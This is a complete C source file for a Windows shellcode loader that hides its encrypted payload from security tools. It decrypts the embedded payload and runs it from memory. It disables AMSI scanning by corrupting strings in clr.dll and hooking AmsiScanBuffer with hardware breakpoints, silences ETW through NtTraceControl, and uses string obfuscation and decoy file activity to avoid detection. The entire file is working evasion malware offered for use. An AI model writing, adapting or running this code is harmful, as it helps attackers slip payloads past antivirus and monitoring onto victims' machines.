/*
 * stager_stageless.c — Crystal Palace PICO loader (stageless EXE)
 *
 * Delivery: single EXE — encrypted PICO embedded at compile time.
 *           AES-256-CBC + XOR rolling encode (entropy ~6.0-6.5).
 *
 * AMSI bypass — dual-layer, zero race condition:
 *  Layer 1 (primary): LdrRegisterDllNotification callback intercepts
 *    clr.dll load and corrupts the "AmsiScanBuffer" string in .rdata
 *    before CLR ever calls GetProcAddress — AMSI never initializes.
 *  Layer 2 (fallback): VEH + HWBP on AmsiScanBuffer + NtTraceControl.
 *
 * ETW bypass:
 *  - DR1 = NtTraceControl -> return STATUS_SUCCESS (ETW silenced)
 *
 * Evasion profile:
 *  - AES-256-CBC via BCrypt + XOR rolling encode
 *  - VirtualAlloc(RW) + VirtualProtect(RX): no RWX ever held
 *  - IAT: kernel32, advapi32, bcrypt — all legitimate
 *  - GUI subsystem, version info resource, asInvoker manifest
 *  - Zero memory patches on amsi.dll or ntdll.dll
 *
 * Build:
 *  x86_64-w64-mingw32-gcc -Wall -Os -mwindows -ffunction-sections \
 *      -fdata-sections -o stager.exe stager_stageless.c resource.o \
 *      -s -Wl,--gc-sections -ladvapi32 -lbcrypt
 */

#include <windows.h>
#include <bcrypt.h>
#include <tlhelp32.h>
#include "payload_stageless.h"

typedef void (*pico_fn)(void *);

/* ── Stack-built strings ───────────────────────────────────────────────── */

#define SPUT(p,i,c) do { volatile char *_v = &(p)[(i)]; *_v = (c); } while(0)
#define WPUT(p,i,c) do { volatile wchar_t *_v = &(p)[(i)]; *_v = (c); } while(0)

static void build_amsi_dll(char out[9])
{
    SPUT(out,0,'a'); SPUT(out,1,'m'); SPUT(out,2,'s'); SPUT(out,3,'i');
    SPUT(out,4,'.'); SPUT(out,5,'d'); SPUT(out,6,'l'); SPUT(out,7,'l');
    SPUT(out,8,0);
}
static void build_amsi_scan_buffer(char out[15])
{
    SPUT(out,0,'A'); SPUT(out,1,'m'); SPUT(out,2,'s'); SPUT(out,3,'i');
    SPUT(out,4,'S'); SPUT(out,5,'c'); SPUT(out,6,'a'); SPUT(out,7,'n');
    SPUT(out,8,'B'); SPUT(out,9,'u'); SPUT(out,10,'f'); SPUT(out,11,'f');
    SPUT(out,12,'e'); SPUT(out,13,'r'); SPUT(out,14,0);
}
static void build_ntdll(char out[10])
{
    SPUT(out,0,'n'); SPUT(out,1,'t'); SPUT(out,2,'d'); SPUT(out,3,'l');
    SPUT(out,4,'l'); SPUT(out,5,'.'); SPUT(out,6,'d'); SPUT(out,7,'l');
    SPUT(out,8,'l'); SPUT(out,9,0);
}
static void build_nt_trace_control(char out[15])
{
    SPUT(out,0,'N'); SPUT(out,1,'t'); SPUT(out,2,'T'); SPUT(out,3,'r');
    SPUT(out,4,'a'); SPUT(out,5,'c'); SPUT(out,6,'e'); SPUT(out,7,'C');
    SPUT(out,8,'o'); SPUT(out,9,'n'); SPUT(out,10,'t'); SPUT(out,11,'r');
    SPUT(out,12,'o'); SPUT(out,13,'l'); SPUT(out,14,0);
}

/* ══════════════════════════════════════════════════════════════════════════
 * LAYER 1 — CLR string corruption via LdrRegisterDllNotification
 * ══════════════════════════════════════════════════════════════════════════ */

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING;

typedef struct _LDR_DLL_NOTIFICATION_DATA {
    ULONG           Flags;
    UNICODE_STRING *FullDllName;
    UNICODE_STRING *BaseDllName;
    PVOID           DllBase;
    ULONG           SizeOfImage;
} LDR_DLL_NOTIFICATION_DATA;

#define LDR_DLL_NOTIFICATION_REASON_LOADED 1

typedef VOID (CALLBACK *PLDR_DLL_NOTIFICATION_FUNCTION)(
    ULONG reason, LDR_DLL_NOTIFICATION_DATA *data, PVOID ctx);

typedef NTSTATUS (NTAPI *pLdrRegisterDllNotification)(
    ULONG flags, PLDR_DLL_NOTIFICATION_FUNCTION cb, PVOID ctx, PVOID *cookie);

static volatile LONG g_clr_patched = 0;

static void corrupt_clr_amsi_string(PVOID dll_base)
{
    if (InterlockedCompareExchange(&g_clr_patched, 1, 0) == 1)
        return;

    char target[15];
    build_amsi_scan_buffer(target);
    int target_len = 14;

    MEMORY_BASIC_INFORMATION mbi;
    BYTE *addr = (BYTE *)dll_base;

    while (VirtualQuery(addr, &mbi, sizeof(mbi)) == sizeof(mbi)) {
        if (mbi.AllocationBase != dll_base)
            break;

        if (mbi.State == MEM_COMMIT &&
            (mbi.Protect == PAGE_READONLY ||
             mbi.Protect == PAGE_READWRITE ||
             mbi.Protect == PAGE_EXECUTE_READ ||
             mbi.Protect == PAGE_EXECUTE_READWRITE)) {

            SIZE_T region_size = mbi.RegionSize;
            BYTE *region = (BYTE *)mbi.BaseAddress;

            for (SIZE_T i = 0; i <= region_size - target_len; i++) {
                int match = 1;
                for (int j = 0; j < target_len; j++) {
                    if (region[i + j] != (BYTE)target[j]) {
                        match = 0;
                        break;
                    }
                }
                if (match) {
                    BYTE *patch_addr = region + i;
                    DWORD old_prot;
                    VirtualProtect(patch_addr, target_len,
                                   PAGE_READWRITE, &old_prot);
                    volatile BYTE *vb = patch_addr;
                    *vb = 'X';
                    VirtualProtect(patch_addr, target_len,
                                   old_prot, &old_prot);
                }
            }
        }

        addr = (BYTE *)mbi.BaseAddress + mbi.RegionSize;
    }
}

static VOID CALLBACK dll_load_callback(
    ULONG reason, LDR_DLL_NOTIFICATION_DATA *data, PVOID ctx)
{
    (void)ctx;
    if (reason != LDR_DLL_NOTIFICATION_REASON_LOADED)
        return;
    if (!data || !data->BaseDllName || !data->BaseDllName->Buffer)
        return;

    wchar_t clr_name[8];
    WPUT(clr_name,0,L'c'); WPUT(clr_name,1,L'l'); WPUT(clr_name,2,L'r');
    WPUT(clr_name,3,L'.'); WPUT(clr_name,4,L'd'); WPUT(clr_name,5,L'l');
    WPUT(clr_name,6,L'l'); WPUT(clr_name,7,0);

    UNICODE_STRING *name = data->BaseDllName;
    if (name->Length / sizeof(wchar_t) != 7)
        return;

    int is_clr = 1;
    for (int i = 0; i < 7; i++) {
        wchar_t a = name->Buffer[i];
        wchar_t b = clr_name[i];
        if (a >= L'A' && a <= L'Z') a += 32;
        if (b >= L'A' && b <= L'Z') b += 32;
        if (a != b) { is_clr = 0; break; }
    }

    if (is_clr)
        corrupt_clr_amsi_string(data->DllBase);
}

static PVOID g_dll_notif_cookie = NULL;

static void register_dll_notification(void)
{
    char s_ntdll[10];
    build_ntdll(s_ntdll);
    HMODULE ntdll = GetModuleHandleA(s_ntdll);
    if (!ntdll) return;

    char fn_name[30];
    SPUT(fn_name,0,'L');  SPUT(fn_name,1,'d');  SPUT(fn_name,2,'r');
    SPUT(fn_name,3,'R');  SPUT(fn_name,4,'e');  SPUT(fn_name,5,'g');
    SPUT(fn_name,6,'i');  SPUT(fn_name,7,'s');  SPUT(fn_name,8,'t');
    SPUT(fn_name,9,'e');  SPUT(fn_name,10,'r'); SPUT(fn_name,11,'D');
    SPUT(fn_name,12,'l'); SPUT(fn_name,13,'l'); SPUT(fn_name,14,'N');
    SPUT(fn_name,15,'o'); SPUT(fn_name,16,'t'); SPUT(fn_name,17,'i');
    SPUT(fn_name,18,'f'); SPUT(fn_name,19,'i'); SPUT(fn_name,20,'c');
    SPUT(fn_name,21,'a'); SPUT(fn_name,22,'t'); SPUT(fn_name,23,'i');
    SPUT(fn_name,24,'o'); SPUT(fn_name,25,'n'); SPUT(fn_name,26,0);

    pLdrRegisterDllNotification fn =
        (pLdrRegisterDllNotification)GetProcAddress(ntdll, fn_name);
    if (fn)
        fn(0, dll_load_callback, NULL, &g_dll_notif_cookie);
}

/* ══════════════════════════════════════════════════════════════════════════
 * LAYER 2 — VEH + HWBP fallback
 * ══════════════════════════════════════════════════════════════════════════ */

static PVOID g_amsi_scan_buf = NULL;
static PVOID g_nt_trace_ctl  = NULL;
static volatile LONG g_addrs_resolved = 0;

static LONG CALLBACK veh_handler(PEXCEPTION_POINTERS ep)
{
    if (ep->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;

    PCONTEXT ctx = ep->ContextRecord;

    if (g_amsi_scan_buf && (PVOID)ctx->Rip == g_amsi_scan_buf) {
        ctx->Rax = (DWORD64)0x80070057;
        ctx->Rip = *(DWORD64 *)ctx->Rsp;
        ctx->Rsp += 8;
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    if (g_nt_trace_ctl && (PVOID)ctx->Rip == g_nt_trace_ctl) {
        ctx->Rax = 0;
        ctx->Rip = *(DWORD64 *)ctx->Rsp;
        ctx->Rsp += 8;
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    return EXCEPTION_CONTINUE_SEARCH;
}

static void resolve_targets(void)
{
    if (InterlockedCompareExchange(&g_addrs_resolved, 1, 0) == 1)
        return;

    char s_amsi_dll[9];  build_amsi_dll(s_amsi_dll);
    char s_asb[15];      build_amsi_scan_buffer(s_asb);
    char s_ntdll[10];    build_ntdll(s_ntdll);
    char s_ntc[15];      build_nt_trace_control(s_ntc);

    HMODULE amsi = LoadLibraryA(s_amsi_dll);
    if (amsi)
        g_amsi_scan_buf = (PVOID)GetProcAddress(amsi, s_asb);

    HMODULE ntdll = GetModuleHandleA(s_ntdll);
    if (!ntdll) return;

    g_nt_trace_ctl = (PVOID)GetProcAddress(ntdll, s_ntc);
}

static void apply_hwbp_to_thread(DWORD tid)
{
    if (!g_amsi_scan_buf && !g_nt_trace_ctl) return;

    HANDLE hThread = OpenThread(
        THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME,
        FALSE, tid);
    if (!hThread) return;

    SuspendThread(hThread);

    CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    if (GetThreadContext(hThread, &ctx)) {
        int dirty = 0;
        if (g_amsi_scan_buf && ctx.Dr0 != (DWORD64)g_amsi_scan_buf) {
            ctx.Dr0 = (DWORD64)g_amsi_scan_buf;
            ctx.Dr7 |= 1;
            ctx.Dr7 &= ~(0xFULL << 16);
            dirty = 1;
        }
        if (g_nt_trace_ctl && ctx.Dr1 != (DWORD64)g_nt_trace_ctl) {
            ctx.Dr1 = (DWORD64)g_nt_trace_ctl;
            ctx.Dr7 |= (1 << 2);
            ctx.Dr7 &= ~(0xFULL << 20);
            dirty = 1;
        }
        if (dirty)
            SetThreadContext(hThread, &ctx);
    }

    ResumeThread(hThread);
    CloseHandle(hThread);
}

static void propagate_all_threads(void)
{
    DWORD pid = GetCurrentProcessId();
    DWORD self = GetCurrentThreadId();

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) return;

    THREADENTRY32 te;
    te.dwSize = sizeof(te);

    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid && te.th32ThreadID != self)
                apply_hwbp_to_thread(te.th32ThreadID);
        } while (Thread32Next(snap, &te));
    }

    CloseHandle(snap);

    CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (GetThreadContext((HANDLE)(LONG_PTR)-2, &ctx)) {
        int dirty = 0;
        if (g_amsi_scan_buf && ctx.Dr0 != (DWORD64)g_amsi_scan_buf) {
            ctx.Dr0 = (DWORD64)g_amsi_scan_buf;
            ctx.Dr7 |= 1;
            ctx.Dr7 &= ~(0xFULL << 16);
            dirty = 1;
        }
        if (g_nt_trace_ctl && ctx.Dr1 != (DWORD64)g_nt_trace_ctl) {
            ctx.Dr1 = (DWORD64)g_nt_trace_ctl;
            ctx.Dr7 |= (1 << 2);
            ctx.Dr7 &= ~(0xFULL << 20);
            dirty = 1;
        }
        if (dirty)
            SetThreadContext((HANDLE)(LONG_PTR)-2, &ctx);
    }
}

static volatile LONG g_monitor_running = 1;

static DWORD WINAPI hwbp_monitor(LPVOID param)
{
    (void)param;
    while (InterlockedCompareExchange(&g_monitor_running, 1, 1) == 1) {
        propagate_all_threads();
        Sleep(500);
    }
    return 0;
}

/* ── Poseidon I/O noise ──────────────────────────────────────────────────── */

static void noise(void)
{
    unsigned char buf[0x1000];
    BCryptGenRandom(NULL, buf, sizeof(buf), BCRYPT_USE_SYSTEM_PREFERRED_RNG);

    wchar_t td[MAX_PATH], tf[MAX_PATH];
    if (GetTempPathW(MAX_PATH, td) && GetTempFileNameW(td, L"upd", 0, tf)) {
        HANDLE h = CreateFileW(tf, GENERIC_WRITE, 0, NULL, OPEN_ALWAYS,
                               FILE_FLAG_DELETE_ON_CLOSE, NULL);
        if (h != INVALID_HANDLE_VALUE) {
            DWORD w;
            WriteFile(h, buf, sizeof(buf), &w, NULL);
            CloseHandle(h);
        }
    }

    SecureZeroMemory(buf, sizeof(buf));
}

/* ── XOR decode (rolling key) ───────────────────────────────────────────── */

static void xor_decode(BYTE *data, DWORD len, const BYTE *key, DWORD key_len)
{
    for (DWORD i = 0; i < len; i++)
        data[i] ^= key[i % key_len];
}

/* ── AES-256-CBC decrypt via BCrypt ──────────────────────────────────────── */

static BYTE *aes_cbc_decrypt(const BYTE *ct, DWORD ct_len, DWORD *pt_len)
{
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    BYTE iv[16];
    DWORD out_len = 0;
    BYTE *pt = NULL;

    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0))
        return NULL;

    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                      (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
                      sizeof(BCRYPT_CHAIN_MODE_CBC), 0);

    if (BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0,
                                   (PUCHAR)payload_key, payload_key_len, 0))
        goto cleanup;

    memcpy(iv, payload_iv, 16);
    BCryptDecrypt(hKey, (PUCHAR)ct, ct_len, NULL,
                  iv, 16, NULL, 0, &out_len, BCRYPT_BLOCK_PADDING);

    pt = (BYTE *)LocalAlloc(LMEM_FIXED, out_len);
    if (!pt) goto cleanup;

    memcpy(iv, payload_iv, 16);
    if (BCryptDecrypt(hKey, (PUCHAR)ct, ct_len, NULL,
                      iv, 16, pt, out_len, pt_len, BCRYPT_BLOCK_PADDING)) {
        LocalFree(pt);
        pt = NULL;
    }

cleanup:
    if (hKey) BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return pt;
}

/* ── PICO execution thread ───────────────────────────────────────────────── */

static DWORD WINAPI worker(LPVOID param)
{
    propagate_all_threads();
    ((pico_fn)param)(NULL);
    return 0;
}

/* ── Entry point ─────────────────────────────────────────────────────────── */

int WINAPI WinMain(HINSTANCE hi, HINSTANCE hp, LPSTR lp, int ns)
{
    (void)hi; (void)hp; (void)lp; (void)ns;

    noise();

    register_dll_notification();
    resolve_targets();

    typedef PVOID (WINAPI *pAddVEH)(ULONG, PVOID);
    char s_aveh[30];
    volatile char *v = s_aveh;
    v[0]='A';  v[1]='d';  v[2]='d';  v[3]='V';  v[4]='e';  v[5]='c';
    v[6]='t';  v[7]='o';  v[8]='r';  v[9]='e';  v[10]='d'; v[11]='E';
    v[12]='x'; v[13]='c'; v[14]='e'; v[15]='p'; v[16]='t'; v[17]='i';
    v[18]='o'; v[19]='n'; v[20]='H'; v[21]='a'; v[22]='n'; v[23]='d';
    v[24]='l'; v[25]='e'; v[26]='r'; v[27]=0;
    pAddVEH fn_aveh = (pAddVEH)GetProcAddress(
        GetModuleHandleA("kernel32.dll"), s_aveh);
    if (fn_aveh) fn_aveh(1, veh_handler);

    HKEY hk = NULL;
    RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                  L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
                  0, KEY_READ, &hk);
    if (hk) RegCloseKey(hk);

    /* XOR decode embedded payload into a heap copy */
    BYTE *ct = (BYTE *)LocalAlloc(LMEM_FIXED, payload_enc_len);
    if (!ct) return 1;
    memcpy(ct, payload_enc, payload_enc_len);
    xor_decode(ct, payload_enc_len, payload_xor_key, payload_xor_key_len);

    /* AES-256-CBC decrypt */
    DWORD pt_len = 0;
    BYTE *pt = aes_cbc_decrypt(ct, payload_enc_len, &pt_len);
    SecureZeroMemory(ct, payload_enc_len);
    LocalFree(ct);
    if (!pt) return 1;

    /* Copy into RW region, wipe heap copy, flip to RX */
    void *rw = VirtualAlloc(NULL, pt_len, MEM_COMMIT | MEM_RESERVE,
                            PAGE_READWRITE);
    if (!rw) { SecureZeroMemory(pt, pt_len); LocalFree(pt); return 1; }

    memcpy(rw, pt, pt_len);
    SecureZeroMemory(pt, pt_len);
    LocalFree(pt);

    DWORD old;
    if (!VirtualProtect(rw, pt_len, PAGE_EXECUTE_READ, &old)) {
        VirtualFree(rw, 0, MEM_RELEASE);
        return 1;
    }

    HANDLE hMon = CreateThread(NULL, 0, hwbp_monitor, NULL, 0, NULL);

    HANDLE h = CreateThread(NULL, 0, worker, rw, 0, NULL);
    if (!h) return 1;

    WaitForSingleObject(h, INFINITE);
    CloseHandle(h);
    if (hMon) CloseHandle(hMon);

    for (;;) SleepEx(30000, TRUE);
}
